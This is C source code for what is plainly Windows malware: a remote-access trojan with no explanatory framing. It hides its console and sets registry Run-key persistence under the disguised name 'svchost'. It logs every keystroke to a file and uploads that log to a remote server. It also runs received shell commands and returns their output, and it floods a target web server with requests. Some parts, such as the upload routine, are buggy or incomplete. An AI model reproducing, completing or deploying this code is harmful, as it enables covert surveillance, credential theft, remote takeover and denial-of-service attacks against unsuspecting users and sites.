#include<stdio.h>
#include<windows.h>
#define sleep(x) Sleep(1000 * (x))
#include<winuser.h>
#include<windowsx.h>
#include <time.h>
#include <winsock.h>

#define BUFSIZE 80
//Function that create connection to the server
int create_conn(int sock, char *server_ip, int server_port){

	struct sockaddr_in server;
	server.sin_addr.s_addr = inet_addr(server_ip);
	server.sin_family = AF_INET;
	server.sin_port = htons( server_port );
	int ris;
	do{
        //printf("pippo");
        //always try to connect
		ris=connect(sock , (struct sockaddr *)&server , sizeof(server));
	}while(ris<0);
	printf("\nConnected");
    return ris;

 }
//Funzione che converte un url in ip
void hostname_to_ip(char *address, char *ip){
	int i;
	struct hostent * he;
	struct in_addr **addr_list;
	he = gethostbyname(address);
	if (he==NULL){
    exit(0);
	}
	 addr_list = (struct in_addr **) he -> h_addr_list;
	 for(i=0; addr_list[i]!=NULL; i++){
		strcpy(ip, inet_ntoa(*addr_list[i]));
	 }
	}
//Function that hides the console
void stealth(){

	HWND st;                                                //Handle to a window
	AllocConsole();
	st=FindWindowA("ConsoleWindowClass",NULL);              //attack the top level window to the handle
	ShowWindow(st,0);                                       //Hide window
}

int create_key(char *path){
	int reg_key;
	int check;
	HKEY hkey;
	reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);		//create the reg key on secified ath

	if(reg_key==0)
	   {
			RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));			//set value on registry key
			check=0;
			return check;
	   }
	if(reg_key!=0)			//Error case
		check=1;

	return check;
}

int test_key(void ){
	int check;
	HKEY hKey;                                              //Handle to registry key
	char path[BUFSIZE];
	DWORD buf_length=BUFSIZE;		                        //unsigned integer
	int reg_key;

	reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);       //open the specified registry key
	if(reg_key!=0){
		check=1;
		return check;
	}
	reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);     //Retrieves the type and data for value name associated with an open registry key.

   if((reg_key!=0)||(buf_length>BUFSIZE))
	   check=2;
   if(reg_key==0)
	   check=0;

   RegCloseKey(hKey);
   return check;
}
//Function to execute the HTTPDOS
void hdos_exe(char *address){
    char *add;
	SOCKET sock_dos;
	time_t st_t, now_t;
	char ip[15], server_ris[512], server_reply[256], *time_s, delim[2]=":";
	time_s = strtok(address, delim);
	int t= atoi(time_s);
	char *ip_p = strtok(NULL, time_s);
	if((sock_dos = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)                   	//Create socket
	{
		exit(0);
	}
	//Split time and address

	if(isalpha(ip_p[0])){                    //Ex: address=ww.xyz.com
		hostname_to_ip(ip_p,ip);
		strcpy(ip_p,ip);
	}
	create_conn(sock_dos, ip_p, 80);
	time(&st_t);
	while(difftime(now_t,st_t)!=t){
		send(sock_dos, "GET /\r\n", strlen("GET /\r\n"),0);
		time(&now_t);
		}

	//recv(sock_dos,server_ris,512,0);

}

int get_keylog(){
	short character;
	while(1){
		//sleep(1);
		for(character=8;character<=222;character++)
		{
			 if(GetAsyncKeyState(character)==-32767){
				FILE *file;
				file=fopen("svchost.log","a+");
				if(file==NULL){
					return 1;
				}
				if(file!=NULL){
					if((character>=39)&&(character<=64)){
						fputc(character,file);
						fclose(file);
						break;
					}
					else if((character>64)&&(character<91)){
						character+=32;
						fputc(character,file);
						fclose(file);
						break;
					}
					else{
						switch(character){
							case VK_SPACE:
								fputc(' ',file);
								fclose(file);
								break;
							case VK_SHIFT:
								fputs("[SHIFT]",file);
								fclose(file);
								break;
							case VK_RETURN:
								fputs("\n[ENTER]",file);
								fclose(file);
								break;
							case VK_BACK:
								fputs("[BACKSPACE]",file);
								fclose(file);
								break;
							case VK_TAB:
								fputs("[TAB]",file);
								fclose(file);
								break;
							case VK_CONTROL:
								fputs("[CTRL]",file);
								fclose(file);
								break;
							case VK_DELETE:
								fputs("[DEL]",file);
								fclose(file);
								break;
							case VK_OEM_1:
								fputs("[;:]",file);
								fclose(file);
								break;
							case VK_OEM_2:
								fputs("[/?]",file);
								fclose(file);
								break;
							case VK_OEM_3:
								fputs("[`~]",file);
								fclose(file);
								break;
							case VK_OEM_4:
								fputs("[ [{ ]",file);
								fclose(file);
								break;
							case VK_OEM_5:
								fputs("[\\|]",file);
								fclose(file);
								break;
							case VK_OEM_6:
								fputs("[ ]} ]",file);
								fclose(file);
								break;
							case VK_OEM_7:
								fputs("['\"]",file);
								fclose(file);
								break;
							case VK_NUMPAD0:
								fputc('0',file);
								fclose(file);
								break;
							case VK_NUMPAD1:
								fputc('1',file);
								fclose(file);
								break;
							case VK_NUMPAD2:
								fputc('2',file);
								fclose(file);
								break;
							case VK_NUMPAD3:
							  	fputc('3',file);
								fclose(file);
								break;
							case VK_NUMPAD4:
								fputc('4',file);
								fclose(file);
								break;
							case VK_NUMPAD5:
								fputc('5',file);
								fclose(file);
								break;
							case VK_NUMPAD6:
								fputc('6',file);
								fclose(file);
								break;
							case VK_NUMPAD7:
								fputc('7',file);
								fclose(file);
								break;
							case VK_NUMPAD8:
								fputc('8',file);
								fclose(file);
								break;
							case VK_NUMPAD9:
								fputc('9',file);
								fclose(file);
								break;
							case VK_CAPITAL:
								fputs("[CAPS LOCK]",file);
								fclose(file);
								break;
							default:
								fclose(file);
                                break;
                        }
                    }
                }
            }
		}
	}
}

int exec_command(char *command, int sock){
    char *var=">svchostout.txt",*word,symbol;
    char *result = malloc(strlen(command)+strlen(var)+1);//+1 for the null-terminator
    int i=0;
    strcpy(result, command);
    strcat(result, var);
    system(result);
    free(result);
    FILE *fp = fopen("svchostout.txt", "r");
    if(fp != NULL)
    {
    	fseek(fp, 0 , SEEK_END);
	  	long fileSize = ftell(fp);
		word=malloc(fileSize*sizeof(char));
		fseek(fp, 0 , SEEK_SET);// needed for next read from beginning of file
	    while((symbol = getc(fp)) != EOF){
            word[i]=symbol;
	  		i++;
        }
        fclose(fp);
        send(sock, word, strlen(word),0);
        free(word);
    }
    else{return 0; }    //Error
    system("del svchostout.txt");
    return 1; //success
}
void upload(){
	char *ftp_ip,symbol, control_sock;
	WSADATA wsa;
	int port;
	SOCKET sock;
	FILE *fp;
	control_sock=WSAStartup(MAKEWORD(2,2),&wsa);
	sock = socket(AF_INET , SOCK_STREAM , 0 );
	create_conn(sock,ftp_ip,port);
	fp=fopen("svchost.log","r");
	fseek(fp, 0L, SEEK_END);
	int sz=ftell(fp);
	rewind(fp);
	send(sock, sz, sizeof(int),0);
	while((symbol=getc(fp))!=EOF){
		send(sock, &symbol, sizeof(char),0);
	}

}
